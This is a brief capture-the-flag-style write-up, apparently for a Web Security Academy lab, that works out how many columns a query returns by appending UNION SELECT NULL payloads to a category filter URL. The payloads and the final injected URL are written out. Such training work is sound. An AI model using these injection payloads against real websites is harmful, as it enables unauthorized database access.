# Lab: SQL injection UNION attack, determining the number of columns returned by the query
## Description

Exercise is simple to identify the number of columns used by the query.



## Solution
By appending the SQL injections below its possible to identified the number of columns used in the SQL query triggered by this URL: `https://ac701fc41fea9e6cc046118300c4008e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories` 


```
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
```

The final injection returned the webpage as normal:

`https://ac701fc41fea9e6cc046118300c4008e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL--`